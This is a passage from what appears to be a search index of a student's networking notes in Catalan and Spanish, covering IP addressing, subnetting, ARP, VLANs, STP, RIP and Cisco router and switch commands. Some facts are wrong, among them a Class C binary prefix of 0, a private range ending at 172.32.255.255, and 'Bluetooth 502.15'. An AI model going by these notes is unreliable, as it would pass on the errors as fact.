2304B)","title":"IPv4"},{"location":"administracion/redes/apuntes-xarxa/#dades-mes-rellevants-a-la-capcalera","text":"Adre\u00e7a origen i dest\u00ed TTL --> Time To Live, quantitat de routers per els quals el paquet pot passar fins que al final es destrueixi. Comanda: Traceroute, mostra tots els routers per els quals passa un paquet fins que arriba al dest\u00ed possible o ha passat per 30 routers. Envia un paquet amb TTL 1, aleshores torna a enviar un amb TTL 2, fins que no deixa de rebre avisos conforme els paquets es destrueixen va enviant i sumant TTL fins al final quedar la quantitat de routers per la qual ha passat el paquet. Ho intenta 3 vegades per router, en cas de que falli alg\u00fan d'aquests hi afegeix un . Tamb\u00e9 pot ser que el router no estigui configurat per a identificar-se i per aix\u00f2 al no donar la seva informaci\u00f3 traceroute afegeix * *. Versi\u00f3 4 o 6. Protocol de la capa superior (Transport, TCP o UDP) Checksum, per comprovar que no hi hagin errors.","title":"Dades m\u00e9s rellevants a la cap\u00e7alera"},{"location":"administracion/redes/apuntes-xarxa/#switch-vs-router","text":"Switch Treballa a la capa 2 del model OSI (Enlla\u00e7 de dades), amb les MAC, nomes pot manipular trames amb origen i dest\u00ed dins de la mateixa LAN. Router Treballa a la capa 3 del model OSI (Xarxa), amb les IP, enruta paquets entre xarxes diferents, permet sortir a altres xarxes com a gateway o porta d'enlla\u00e7.","title":"Switch VS Router"},{"location":"administracion/redes/apuntes-xarxa/#ip-r","text":"Ens mostra el nostre gateway configurat per defecte.","title":"ip r"},{"location":"administracion/redes/apuntes-xarxa/#mac","text":"La MAC nom\u00e9s t\u00e9 sentit utilitzar-la dins de la meva xarxa local.","title":"MAC"},{"location":"administracion/redes/apuntes-xarxa/#a-tenir-en-compte","text":"El GATEWAY ha d'estar a la mateixa xarxa que el dispositiu Les IP han de coincidir en el rang d'adreces de xarxa Cada dispositiu ha de saber quin \u00e9s el seu gateway (Manualment o amb DHCP) Cada router ha de seaber com redirigir una adre\u00e7a IP (Taules d'enrutament) Els routers entre ells creen una xarxa sense dispositius finals","title":"A tenir en compte"},{"location":"administracion/redes/apuntes-xarxa/#comandes-basiques","text":"[isx46420653@j07 Xarxes]$ ip a 2: enp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 14:da:e9:b6:e5:13 brd ff:ff:ff:ff:ff:ff inet 192.168.3.7/16 brd 192.168.255.255 scope global dynamic enp2s0 valid_lft 12863sec preferred_lft 12863sec inet6 fe80::16da:e9ff:feb6:e513/64 scope link valid_lft forever preferred_lft forever [isx46420653@j07 Xarxes]$ ip route default via 192.168.0.1 dev enp2s0 proto static metric 100 192.168.0.0/16 dev enp2s0 proto kernel scope link src 192.168.3.7 metric 100 [isx46420653@j07 Xarxes]$ route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default router.informat 0.0.0.0 UG 100 0 0 enp2s0 192.168.0.0 0.0.0.0 255.255.0.0 U 100 0 0 enp2s0","title":"Comandes b\u00e0siques"},{"location":"administracion/redes/apuntes-xarxa/#tipus-denrutament","text":"Manual Implica que qualsevol canvi a la xarxa obliga a modificar els taules d'enrutament Autom\u00e0tic Els routers es comuniquen entre ells per a saber on enviar la informaci\u00f3 i per quin cam\u00ed pot ser m\u00e9s r\u00e0pid, utilitzen el RIP (Routing Information Protocol) que \u00e9s el m\u00e9s utilitzat.","title":"Tipus d'enrutament"},{"location":"administracion/redes/apuntes-xarxa/#adrecament-ip","text":"En totes les xarxes n'hi h'an 2 ip que no es poden utilitzar: la mes petita ( la de xarxa ) la mes gran ( la de brodcast )","title":"Adre\u00e7ament ip"},{"location":"administracion/redes/apuntes-xarxa/#broadcast","text":"existeixen 2 tipus de brodcast Dirigit: quan enviem el misatge bradcast a un altre xarxa, cal configurar el ruter perque es permeti. Limitada: limitada a la propia xarxa, els rutes descarten l'enrutament dels missatges dirigits a aquesta ip.","title":"Broadcast"},{"location":"administracion/redes/apuntes-xarxa/#rangs-ips","text":"Dispositius: 0.0.0.0 a la 223.255.255.255 Multicast: 224.0.0.0 a la 239.255.255.255 Experimentals: 240.0.0.0 a la 255.255.255.254","title":"Rangs ip's"},{"location":"administracion/redes/apuntes-xarxa/#privades","text":"Poden repetirse entre diferents xarxes locals, i mai surten de la xarxa local, si cal sortir s'utilitzara un NAT o PAT.","title":"Privades"},{"location":"administracion/redes/apuntes-xarxa/#publiquers","text":"Dispositius que han de sortir a internet, principalment routers o servidors.","title":"Publiquers"},{"location":"administracion/redes/apuntes-xarxa/#adreces-especials","text":"Son les adreses que no es poden asignar a un dispositiu. adreses de xarxa o brodcast rutes per defecte (0.0.0.0/0) les que s'utilitcen en les taules d'enrutament com a opci\u00f3 per defecte. loopback (127.0.0.0/8) es una ip reservada per enviarse trafic a si mateix. D'enlla\u00e7 local En xarxas punt a punt o quan no hem obtungut adrea\u00e7a DHCP","title":"Adreces especials"},{"location":"administracion/redes/apuntes-xarxa/#classes","text":"Classe A de 0.0.0.0/8 a 127.0.0.0/8 xarxes grans 16\u00b710**6 dispositius En la seva representaci\u00f3 binaria sempre comencen per 0 Classe B de 128.0.0.0/16 a 191.255.0.0/16 xarxes mitjanes-grans 65000 dispositius En la seva representaci\u00f3 binaria sempre comencen per 10 Classe C de 192.0.0.0/24 a 223.255.255.255/24 xarxes petites 254 dispositius En la seva representaci\u00f3 binaria sempre comencen per 0 Classfull ....","title":"Classes"},{"location":"administracion/redes/apuntes-xarxa/#divisio-subxarxes","text":"A partir duna xarxa mare, podem agafar bits a la part de hosts per crear subxarxes. El numero de subxarxes depen del n\u00famero de bits que agafas. Exemple: xarxa mare: 192.168.4.0/24, si agafem 2 bits 192.168.4.0/26 amb 2**2 podem fer 4 subxarxes. 00 01 10 11","title":"Divisio subxarxes"},{"location":"administracion/redes/apuntes-xarxa/#capa-acceso-a-la-red","text":"interactua con dos capas del modelo OSI, capa enlace de datos y f\u00edsica. Enlace de datos: interactua con la capa de internet obtiene el paquete lo encapsula y crea una nueva PDU denominada trama, el dato mas importante que a\u00f1ade es la vmac origen y destino. F\u00edsica: codifica/descodifica los bits seg\u00fan el medio. impulsos electricos, ondas electromagneticas o luz. El objetivo de la capa f\u00edsica es crear o interpretar las se\u00f1ales que representan los bits de la trama.","title":"Capa acceso a la red"},{"location":"administracion/redes/apuntes-xarxa/#mac_1","text":"La mac es una direcci\u00f3n del protocolo internet, identifica de forma unica una interficie de red, en principo no la podemos cambiar al estar grabada en la ROM de la NIC. las comunicaciones dentro de una misma red se realizan mediante la mac, por tanto necesitamos el protocolo ARP.","title":"Mac"},{"location":"administracion/redes/apuntes-xarxa/#arp-permet-la-comunicacio-mitjancant-un-protocol","text":"Adress Resolution Protocol --> Troba la direcci\u00f3 MAC que correspon a una IP El protocolo ARP hace la traducci\u00f3n de ip a mac, lo hace mandando un brodcast en formato MAC y solo respondera el que tiene la ip asociada a esa mac especifica. esta la guarda en una cache para en futuras conexiones no tener que repetir el proceso. arp comando parta ver la cache.","title":"ARP, permet la comunicaci\u00f3 mitjan\u00e7ant un protocol"},{"location":"administracion/redes/apuntes-xarxa/#estandards","text":"Hi han uns determinats est\u00e0ndards que permeten que diversos elements de diversos fabricants puguin ser compatibles entre ells. Ethernet: Connector RJ45 i el medi \u00e9s el UTP, Unshielded TwistedPair o Parell Trenat (de coure) UTP amb RJ45: 10BASE-T (10Mbps) 100BASE-TX (100Mbps) 1000BASE-T (1Gbps) Wireless: Bluetooth 502.15 --> Velocitats baixes <1 Mbps, dist\u00e0ncies curtes i entre dispositius propers. 802.11 (a,b,g,n) --> Velocitats altes(fins a 54 Mbps), dist\u00e0ncies mitjanes, popularment \u00e9s el Wi-Fi. GSM,GPRS,3G i 4G --> Dist\u00e0ncies llargues, s'utilitzen als m\u00f2bils. Hem de tenir en compte que existeixen les interfer\u00e8ncies, ja siguin en medis wireless o en medis cablejats.","title":"Est\u00e0ndards"},{"location":"administracion/redes/apuntes-xarxa/#interficies","text":"","title":"Interficies"},{"location":"administracion/redes/apuntes-xarxa/#cables","text":"El cable mas habitual es UTP Unshielded ( desprotegido ) o Parell trenat ( de cobre ) Este cable no tiene mucho rebestimiento para evitar interferencias. El formato de creaci\u00f3n actualmente es el directo, los 2 extremos seran iguales. Antiguamente en una conexi\u00f3n dfe host a host, se utilizaba un cable cruzado para que no coincida salida con salid o entrada con entrada. Hoy en dia las targetas de red ya reconocen las entradas y salidas y las reordenan automaticamente.","title":"Cables"},{"location":"administracion/redes/apuntes-xarxa/#stp","text":"Es un cable UTP con un blindage extra para minimizar interferencias","title":"STP"},{"location":"administracion/redes/apuntes-xarxa/#fibra","text":"Ancho de banda alto y distancias de mas de 100m","title":"Fibra"},{"location":"administracion/redes/apuntes-xarxa/#inalambrico","text":"","title":"Inalambrico"},{"location":"administracion/redes/apuntes-xarxa/#bluethooth","text":"Bajo consumo de energ\u00eda, distancias cortas, frecuencia baja.","title":"Bluethooth"},{"location":"administracion/redes/apuntes-xarxa/#wifi","text":"802.11 (a,b,g,n) Velocidades altas ( de 54 Mbps a 5 Gbps) , distancias medianas","title":"Wifi"},{"location":"administracion/redes/apuntes-xarxa/#planificacio-i-administracio-de-xarxes","text":"","title":"Planificaci\u00f3 i Administraci\u00f3 de Xarxes"},{"location":"administracion/redes/apuntes-xarxa/#adrecament-ip_1","text":"","title":"Adre\u00e7ament ip"},{"location":"administracion/redes/apuntes-xarxa/#adreca-de-xarxa","text":"AX = Adrea\u00e7a de xarxa MX = M\u00e0scara de Xarxa AX = IP AND MX Exemple: IP --> 10.10.10.65/26 MX --> 255.255.255.192 AX --> 10.10.10.64","title":"Adre\u00e7a de Xarxa"},{"location":"administracion/redes/apuntes-xarxa/#adreca-de-broadcast","text":"\u00c9s la \u00faltima adre\u00e7a disponible de la xarxa, la m\u00e9s gran. S'utilitza per a enviar missatges a TOTS els dispositius d'una xarxa. A la pr\u00e0ctica, tots els bits de host s\u00f3n 1. AB = adre\u00e7a de broadcast AB = IP OR (NOT MX) Exemple (Octets perfectes): IP --> 10.10.10.7/24 MX --> 255.255.255.0 AX --> 10.10.10.0 AB --> 10.10.10.255 Exemple (Octets imperfectes): Recordar: (A la pr\u00e0ctica, tots els bits de host s\u00f3n 1.) IP --> 10.10.10.7/26 MX --> 255.255.255.192 AX --> 10.10.10.0 AB --> 10.10.10.63","title":"Adre\u00e7a de Broadcast"},{"location":"administracion/redes/apuntes-xarxa/#comunicacio-de-dispositius","text":"Unicast: Comunicaci\u00f3 entre 2 dispositius Broadcast: Comunicaci\u00f3 amb tota la xarxa. Dirigit: que enviem el missatge broadcast a una altra xarxa ( sutilitza ip de la xarxa externa ) limitat: en la propia xarxa Multicast: Comunicaci\u00f3 amb un conjunt de dispositius. s'hi ha de tenir un grup multicast asignat, en un rang d'adresses 224.0.0.0 a la 239.255.255.255. Els clients que participen en el grup tenen dues adresses, la seva i la multicast.","title":"Comunicaci\u00f3 de dispositius"},{"location":"administracion/redes/apuntes-xarxa/#rang-dadreces-ip","text":"De dispositius: Van de la 0.0.0.0 a la 223.255.255.255 Multicast: 224.0.0.0 a la 239.255.255.255 Experimentals: 240.0.0.0 a la 255.255.255.254","title":"Rang d'adre\u00e7es IP"},{"location":"administracion/redes/apuntes-xarxa/#classificacio-dadreces-ip","text":"Privades : Poden repetir-se dins de les xarxes locals, i mai surten d'ella. Existeixen 3 rangs: (Est\u00e0ndard) Xarxes grans: 10.0.0.0/8 a 10.255.255.255 Xarxes mitjanes: 172.16.0.0/12 a 172.32.255.255 Xarxes petites: 192.168.0.0/16 a 192.168.255.255 P\u00fabliques: Han de sortir a internet, normalment les tenen els routers o servidors, s\u00f3n \u00faniques. Adreces especials: Adreces de xarxa o Broadcast, la 0.0.0.0/8 \u00e9s la ruta per defecte el 127.0.0.0/8 \u00e9s el loopback la 169.254.0.0/16 \u00e9s la d'enlla\u00e7 local, en xarxes P2P o quan no hem obtingut adre\u00e7a del DHCP.","title":"Classificaci\u00f3 d'adre\u00e7es IP"},{"location":"administracion/redes/apuntes-xarxa/#classes-dip","text":"Classe A : Xarxes MOLT grans, permeten 16*10**6 dispositius, van de la 0.0.0.0/8 a la 127.0.0.0/8, en binari sempre comencen per 0. Classe B: Xarxes mitjanes, permeten uns 65000 dispositius, van de la 128.0.0.0/16 a la 191.255.0.0/16, en binari sempre comencen per 10. Classe C: Xarxes petites, permeten uns 254 dispositius, van de la 192.0.0.0/24 a la 223.255.255.255/24, en binari sempre comencen per 110.","title":"Classes d'IP"},{"location":"administracion/redes/apuntes-xarxa/#assignacio-dip","text":"IANA es l'organisme encarregat d'assignar ip's A dia d'avui l'assignaci\u00f3 la delega als RIR , els RIR assignen les IP disponibles als ISP de la zona, que les distribueixen als seus clients.","title":"Assignaci\u00f3 d'IP"},{"location":"administracion/redes/apuntes-xarxa/#resum-de-rutes","text":"Per no haver d'afegir 2 entrades a la taula d'enrutament podem fer: 192 .168.1.0/24 192 .168.2.0/24 x.x.00000001.x x.x.00000010.x L'entrada 192.168.0.0/22 afecta a les xarxes 192.168.1.0, 192.168.2.0 i 192.168.3.0, tenint en compte que totes elles surten per la mateixa interf\u00edcie. Alguns routers tenen en compte sempre la m\u00e0scara de xarxa m\u00e9s alta, de manera que si hi han 2 entrades a la taula d'enrutament amb la mateixa IP, una resumida i l'altra individual, el router funcionar\u00e0 amb l'entrada individual perqu\u00e8 la m\u00e0scara \u00e9s m\u00e9s gran. Exemple: 192.168.0.0/22 192.168.x.x 192.168.3.0/24 192.168.x.x --> Aquesta t\u00e9 prioritat al router.","title":"Resum de rutes"},{"location":"administracion/redes/apuntes-xarxa/#enrutamentamiento","text":"","title":"Enrutamentamiento"},{"location":"administracion/redes/apuntes-xarxa/#rip","text":"Rip es un protocolo para enrutar dinamicamente, esto se produce en mensages tipo broadcast que envian los routes. En dicho mensage cada router envia que redes tiene e sus interficies, y van rellenando las tablas de enrutamientos con ellas. versi\u00f3n 1: classful , acepta subneting pero no superneting. clasful se basa en clases de ip por lo tanto es incapaz de enrutar redes con superneting. version 2: lessful, envia ip con mascara auto-summary : Es la opcion por defecto, crea resumen de rutas. no auto-sumary : No crea resumen de rutas, en ocasiones hay que habilitarlo para evitar alg\u00fan conflicto con el resumen de rutas. Tanto la versi\u00f3n 1 como la 2, a no ser que este el auto-summary desactivado el protocolo rip ar\u00e1 resumenes de rutas automaticamente.","title":"Rip"},{"location":"administracion/redes/apuntes-xarxa/#switches","text":"Un switch trabaja con macs en protocolo ARP, capa 2 modelo tcp/ip. El protocolo ARP evita colisiones segmentando cada paquete y redirigiendolo al dispositivo pertinente. El switch es la actualizaci\u00f3n de hub donde el hub es un replicador de datos y el switch redirige cada mensage por la interfaz concreta. hub capa1, switch capa 2. switch evita colisiones en la medida de lo posible. opcion1: utilizada por el hub, CSMA/CD, espera a que la linea quede bacia para poder transmitir. opcion2: utilizada por switch, Segmentaci\u00f3n de paquetes junto al protocolo ARP, para distribuir cada segmento al dispositivo indicado. mirroring port : Es una practica para detectar todos los paquetes entrantes y salientes de una red, consiste en conectarse por encima de la conexi\u00f3n del switch y as\u00ed poder recibir todos los paquetes entrantes y salientes. Metodo sticky: convierte asignacion mac de arp dinamica en est\u00e1tica Spanning Tree Protocol: Es un protocolo de switches que evita la tormenta de broadcast.","title":"Switches"},{"location":"administracion/redes/apuntes-xarxa/#csmacd","text":"Es un mecanismo que incorporan algunos dispositivos, y funciona que si en un medio f\u00edsico se quieren transmitir datos se escucha y se espera a que el medio este libre para transmitir. csma/cd no segmenta las tramas.","title":"CSMA/CD"},{"location":"administracion/redes/apuntes-xarxa/#dominio-de-colision","text":"Es un grupo de dispositivos conectados al mismo medio f\u00edsico, de tal manera que si dos dispositivos acceden al mismo medio a la vez se produce una colision.","title":"Dominio de colisi\u00f3n"},{"location":"administracion/redes/apuntes-xarxa/#dominio-de-difusion","text":"Un dominio de difusi\u00f3n englova todos los dispositivos de una LAN o VLAN, es el area donde puede acceder un broadcast.","title":"Dominio de difusi\u00f3n"},{"location":"administracion/redes/apuntes-xarxa/#administracion-avanzada-de-redes","text":"","title":"Administraci\u00f3n Avanzada de Redes"},{"location":"administracion/redes/apuntes-xarxa/#vlan","text":"Una vlan sirve para dividir una red en m\u00faltiples redes y as\u00ed poder romper un \u00e1rea de dominio de difusi\u00f3n en m\u00faltiples de colisi\u00f3n. La ventaja es que no necesitamos un router para la divisi\u00f3n de redes, si no que el mismo switch puede hacer estas divisiones, as\u00ed ahorrando costes y con un mayor rendimiento. La vlan por defecto ( nativa ) es la 1 a\u00fan que se puede modificar al gusto. Funciona en 2 pasos: crear las vlan identific\u00e1ndolas con un n\u00famero Asignando la interficie a la vlan","title":"Vlan"},{"location":"administracion/redes/apuntes-xarxa/#enlaces-troncales","text":"Los enlaces troncales se asignan a interficies entre dos switches o de switch a router, en la que se comunicaran diferentes vlans por la misma interficie. Si no existiese este tipo de enlace se tendr\u00eda que conectar dos dispositivos tantas veces como vlans tuviera configuradas.","title":"Enlaces Troncales"},{"location":"administracion/redes/apuntes-xarxa/#8021q-dot1q","text":"En los enlaces troncales se asigna una etiqueta o tagged para diferenciar las tramas que pertenecen a cada vlan, en caso de que no fuera as\u00ed el switch no podr\u00eda saber que trama pertenece a que vlan. Las tramas de la vlan nativa son las \u00fanicas que pasan por el enlace trunck sin la etiqueta adicional dot1q","title":"802.1Q ( DOT1Q)"},{"location":"administracion/redes/apuntes-xarxa/#enrutamiento-vlan","text":"En el modo tradicional cada vlan tiene que estar conectado a una interficie del router pero esto consume muchas interficies y no es rentable, por eso se combina modo trunk (router on a stick) con el tradicional seg\u00fan nuestras necesidades.","title":"Enrutamiento Vlan"},{"location":"administracion/redes/apuntes-xarxa/#router-on-a-stick","text":"Se configura una interficie que acepte diversas vlan. #Creaci\u00f3 de la interf\u00edcie 10 associada a la fa0/0 Router ( config ) # interface fa0/0.10 Router ( config-subif ) # encapsulation dot1q 10 Router ( config-subif ) # ip address 192.168.1.129 255.255.255.224 Router ( config ) # interface fa0/0.20 Router ( config-subif ) # encapsulation dot1q 20 Router ( config-subif ) # ip address 192.168.1.65 255.255.255.224 Router ( config ) # interface fa0/0 Router ( config ) # no shutdown En este caso la interface 0/0 englova 2 vlans la 10 y la 20. Pros y Contras Tradicional: utiliza muchas interficies f\u00edsicas. cada vlan tiene todo el ancho de banda de la interficie Stick: se puede gestionar muchas vlan en pocas interficies todas las vlan de la misma interficie comparten ancho de banda","title":"Router On A Stick"},{"location":"administracion/redes/apuntes-xarxa/#stp_1","text":"Stp ( Spanning Tree Protocol ), tiene la funci\u00f3n de gestionar bucles en topolog\u00edas de red, evitando tormentas de broadcast. El protocolo permite a los dispositivos activar o desactivar autom\u00e1ticamente los enlaces de red. El protocolo establece un switch como ra\u00edz ( Root Bridge ) y los dem\u00e1s switch de la topolog\u00eda establecen la ruta mas corta hacia la ra\u00edz como Root Port, en el extremo contrario del enlace de Root Port siempre estar\u00e1 Designed Port. En el caso de que en un enlace no haya ning\u00fan RP, por lo tanto queda un enlace con dos extremos DP designed port, en el que tenga la mac mas alta se establecer\u00e1 como BP blocked port para evitar bucles. El Root Bridge se establece en el switch que tiene la mac mas baja en la vlan en uso, esta prioridad de ra\u00edz es modificable mediante comandos al router deseado.","title":"STP"},{"location":"administracion/redes/comandos_router_switch/","text":"Configuraci\u00f3 de Routers Habilitar redireccionamiento ip en un pc. echo 1 > /proc/sys/net/ipv4/ip_forward Software per a crear connexions entre el PC i el router, el Minicom funciona amb text, farem servir el Putty . Instal\u00b7lem Putty : sudo dnf -y install putty S'executa simplement amb la comanda: putty Connectem el router amb el cable de consola cap a l'ordinador amb l'adaptador USB, autom\u00e0ticament Linux crea el fitxer de la connexi\u00f3 a /dev/ttyUSB0, aquest fitxer nom\u00e9s t\u00e9 permisos per a Root i per al grup dialout , si el volem utilitzar hem de fer: Canviar els permisos i posar-los per a others tamb\u00e9, tenint en compte que ho haurem de fer cada vegada que connectem de nou el router, ja que el fitxer s'esborra al desconnectar l'aparell i es crea de nou amb els valors per defecte al connectar-lo de nou. Afegir-nos al grup dialout amb la comanda: usermod -G dialout isx46..... Cal fer un logout despr\u00e9s d'afegir-se al grup!! Obrim Putty Creem els valors /dev/ttyUSB0 a Serial Line, guardem la configuraci\u00f3 amb algun nom qualsevol i obrim la finestra. Al obrir la finestra es mostra una pantalla negra, NO s'ha penjat, prem\u00e8m enter i ja comen\u00e7a a mostrar informaci\u00f3, si no surt res, comprovar sobretot el cable de consola que estigui ben connectat. Comandos configuraci\u00f3n router Router> enable # entrar en el router Router# configure terminal # entrar en la configuraci\u00f3n Router ( config ) # erase startup-config # resetear configuraci\u00f3n Router ( config ) # hostname R3 # establecer hostame Router ( config ) # banner motd #!!ACCESO SOLO A PERSONAS AUTORIZADAS Guardar configuraci\u00f3n Router# copy run start Asignar ip Router ( config ) # interface f0/0 Router ( config-if ) # ip address 192.168.0.1 255.255.255.0 Router ( config-if ) # no shutdown En cables serial puede que tengas o no que indicar el marcador de tiempo seg\u00fan el cable. Router ( config ) # interface serial0/0/0 Router ( config-if ) # ip address 192.168.0.1 255.255.255.0 Router ( config-if ) # clock rate 64000 # opcional si es macho o hembra Router ( config-if ) # no shutdown Vlan Asignar diferentes vlan en una misma interficie f\u00edsica. Router ( config ) # interface f0/0.10 Router ( config-subif ) # encapsulation dot1q 10 Router ( config-subif ) # ip address 192.168.10.1 255.255.255.0 Router ( config ) # interface f0/0.20 Router ( config-subif ) # encapsulation dot1q 20 Router ( config-subif ) # ip address 192.168.20.1 255.255.255.0 Router ( config ) # interface f0/0 Router ( config-if ) # no shutdown dhcp Router ( confi ) # ip dhcp pool red_local1 Router ( confi ) # ip dhcp excluded-address 172.16.3.1 Router ( dhcp-confi ) # default-router 172.16.3.1 Router ( dhcp-confi ) # network 172.16.3.0 255.255.255.0 Router ( dhcp-confi ) #end Router# show ip dhcp binding Enrutar Para enrutar indicamos red destino , mascara de dicha red y por que ip de router debe salir. Router ( config ) # ip route 172.16.10.0 255.255.255.0 10.10.1.2 Rip rip permite automatizar las rutas de enrutamiento, en cada router se le indica que red tiene asignadas y el mismo, va hablando con los demas routers, para automatizar la tablas. Router0 ( confi ) # Router rip Router0 ( dhcp-confi ) # network 163.27.176.0 Router0 ( dhcp-confi ) # network 163.27.240.0 Router0 ( dhcp-confi ) # Passive-interface f0/0 Router0 ( dhcp-confi ) # Passive-interface f0/1 Router0 ( dhcp-confi ) # version 2 passive-interface nos ofrece el no mandar mensages por esa interficie, se utiliza en redes finales. show ip rip database consultar la base de datos. Contrase\u00f1as Contrase\u00f1a en el login de entrada R1 ( config ) #line console 0 R1 ( config-line ) #password passcon R1 ( config-line ) #login Contrase\u00f1a de la configuraci\u00f3n Router ( config ) # enable secret XXXX # establecer password cifrada a configuraci\u00f3n Contrase\u00f1a acceso al router remotamente. si no establecemos una contrase\u00f1a por esta via no se podr\u00e1 acceder remotamente. R1 ( config ) #line vty 0 4 R1 ( config-line ) #password passvty R1 ( config-line ) #login Informaci\u00f3n configuraci\u00f3n Router# show ? # indica que comandos existen con show Router# show interfaces # muestra interfaces Router# show interfaces serial 0 /0/0 # muestra interfaces serial Router# show versi\u00f3n # muestra versi\u00f3n del cisco. Router# show ip interfaces serial 0 /0/0 # muestra interfaces serial Router# show ip interfaces brief # muestra las conexiones ( activadas, desactivadas) Router# show arp # tabla de macs, ips Router# startup-config # muestra la configuraci\u00f3n guardada. Router# show ip route # muestra tablas de enrutamiento Router# show ip dhcp binding # conf de dhcp Router# show ip rip database # consultar base de datos rip Tablas de enrutamiento Conectadas directamente Las que detecta el router directamente por que estan conectadas directamente Estaticas Las que a\u00f1ado manualmente Dinamicas Se comunican tre routers y establecen sus tablas Por defecto la ruta de salir si no conoce la red 0.0.0.0/0 communtacion. pc1 se comunica con pc2 en otra red. pc1 mira si la ip pertenece a su red mira si tiene la mac en la cache de arp, si no, busca al geatwey. si no pertenece busca la red en el gateway los gateways tienen unav mac por cada interficie Comandos switch Los comandos de switch son como el router con algunos extras. interface range fastEthernet 0 /5 - 24 # acceder a un rango de interficies ( util para cerrar puertos ) mac-address-table static 0010 .1112.39A3 vlan 1 interface f0/1 # asignar mac statica en puerto show mac-address-table # mostrar tabla arp Configuracio i consulta de la Taula MAC #Modificaci \u0301o del temps d\u2019expiraci \u0301o de les MAC din`amiques Switch ( config ) mac-address-table aging-time NUM #Configuraci \u0301o d\u2019una MAC est`atica (MAC en format XXXX.YYYY.ZZZZ) Switch ( config ) mac-address-table static MAC vlan { 1 -4096, ALL } interface NOM #Eliminaci \u0301o d\u2019una MAC est`atica Switch ( config ) no mac-address-table static MAC vlan { 1 -4096, ALL } interface NOM Switch ( config ) show mac-address-table Vlan Crear vlan Switch ( config ) # vlan ID Switch ( config-vlan ) # name NOM #Creaci \u0301o d\u2019un conjunt de VLANs Switch ( config ) # vlan ID1, ID2, ID3 #Creaci \u0301o d\u2019un rang de VLANs Switch ( config ) # vlan ID1-ID2 Mode acces Switch ( config ) # interface NOM Switch ( config-if ) # switchport mode access Switch ( config-if ) # switchport access vlan ID Eliminar access Switch ( config ) # interface NOM Switch ( config-if ) # no switchport access vlan Trunk Switch ( config ) interface NOM Switch ( config-if ) switchport mode trunk Switch ( config-if ) switchport trunk native vlan ID #Opcional #Nomes permet l\u2019acces a la VLAN ID Switch ( config-if ) switchport trunk allowed vlan ID #Nomes permet l\u2019acces a les VLANs ID1, ID2 i ID3 Switch ( config-if ) switchport trunk allowed vlan ID1,ID2,ID3 #Nomes permet l\u2019acces a les VLANs del rang ID1-ID2 Switch ( config-if ) switchport trunk allowed vlan ID1-ID2 #Afegeix la VLAN ID a les ja permeses en el trunk Switch ( config-if ) switchport trunk allowed vlan add ID # quitar vlan de puerto trunk Switch ( config-if ) switchport trunk allowed vlan remove ID Eliminar trunk Switch ( config ) # interface NOM Switch ( config-if ) # no switchport trunk allowed vlan Switch ( config-if ) # no switchport trunk native vlan Switch ( config-if ) # switchport mode access Stp A\u00f1adir Bridge Root, cabeza en arbol de prioridad. Switch0 ( config ) #spanning-tree vlan 1 root primary Switch0#show spanning-tree active Switch0#show spanning-tree detail Ip switch asignar una ip a un switch config t interface vlan 1 ip address 192 .168.1.1 255 .255.255.0 Mostrar Switch# show vlan Switch# show vlan brief Switch# show interface trunk Switch# show interface vlan 1","title":"Configuraci\u00f3 de Routers"},{"location":"administracion/redes/comandos_router_switch/#configuracio-de-routers","text":"Habilitar redireccionamiento ip en un pc. echo 1 > /proc/sys/net/ipv4/ip_forward Software per a crear connexions entre el PC i el router, el Minicom funciona amb text, farem servir el Putty . Instal\u00b7lem Putty : sudo dnf -y install putty S'executa simplement amb la comanda: putty Connectem el router amb el cable de consola cap a l'ordinador amb l'adaptador USB, autom\u00e0ticament Linux crea el fitxer de la connexi\u00f3 a /dev/ttyUSB0, aquest fitxer nom\u00e9s t\u00e9 permisos per a Root i per al grup dialout , si el volem utilitzar hem de fer: Canviar els permisos i posar-los per a others tamb\u00e9, tenint en compte que ho haurem de fer cada vegada que connectem de nou el router, ja que el fitxer s'esborra al desconnectar l'aparell i es crea de nou amb els valors per defecte al connectar-lo de nou. Afegir-nos al grup dialout amb la comanda: usermod -G dialout isx46..... Cal fer un logout despr\u00e9s d'afegir-se al grup!! Obrim Putty Creem els valors /dev/ttyUSB0 a Serial Line, guardem la configuraci\u00f3 amb algun nom qualsevol i obrim la finestra. Al obrir la finestra es mostra una pantalla negra, NO s'ha penjat, prem\u00e8m enter i ja comen\u00e7a a mostrar informaci\u00f3, si no surt res, comprovar sobretot el cable de consola que estigui ben connectat.","title":"Configuraci\u00f3 de Routers"},{"location":"administracion/redes/comandos_router_switch/#comandos-configuracion-router","text":"Router> enable # entrar en el router Router# configure terminal # entrar en la configuraci\u00f3n Router ( config ) # erase startup-config # resetear configuraci\u00f3n Router ( config ) # hostname R3 # establecer hostame Router ( config ) # banner motd #!!ACCESO SOLO A PERSONAS AUTORIZADAS","title":"Comandos configuraci\u00f3n router"},{"location":"administracion/redes/comandos_router_switch/#guardar-configuracion","text":"Router# copy run start","title":"Guardar configuraci\u00f3n"},{"location":"administracion/redes/comandos_router_switch/#asignar-ip","text":"Router ( config ) # interface f0/0 Router ( config-if ) # ip address 192.168.0.1 255.255.255.0 Router ( config-if ) # no shutdown En cables serial puede que tengas o no que indicar el marcador de tiempo seg\u00fan el cable. Router ( config ) # interface serial0/0/0 Router ( config-if ) # ip address 192.168.0.1 255.255.255.0 Router ( config-if ) # clock rate 64000 # opcional si es macho o hembra Router ( config-if ) # no shutdown","title":"Asignar ip"},{"location":"administracion/redes/comandos_router_switch/#vlan","text":"Asignar diferentes vlan en una misma interficie f\u00edsica. Router ( config ) # interface f0/0.10 Router ( config-subif ) # encapsulation dot1q 10 Router ( config-subif ) # ip address 192.168.10.1 255.255.255.0 Router ( config ) # interface f0/0.20 Router ( config-subif ) # encapsulation dot1q 20 Router ( config-subif ) # ip address 192.168.20.1 255.255.255.0 Router ( config ) # interface f0/0 Router ( config-if ) # no shutdown","title":"Vlan"},{"location":"administracion/redes/comandos_router_switch/#dhcp","text":"Router ( confi ) # ip dhcp pool red_local1 Router ( confi ) # ip dhcp excluded-address 172.16.3.1 Router ( dhcp-confi ) # default-router 172.16.3.1 Router ( dhcp-confi ) # network 172.16.3.0 255.255.255.0 Router ( dhcp-confi ) #end Router# show ip dhcp binding","title":"dhcp"},{"location":"administracion/redes/comandos_router_switch/#enrutar","text":"Para enrutar indicamos red destino , mascara de dicha red y por que ip de router debe salir. Router ( config ) # ip route 172.16.10.0 255.255.255.0 10.10.1.2","title":"Enrutar"},{"location":"administracion/redes/comandos_router_switch/#rip","text":"rip permite automatizar las rutas de enrutamiento, en cada router se le indica que red tiene asignadas y el mismo, va hablando con 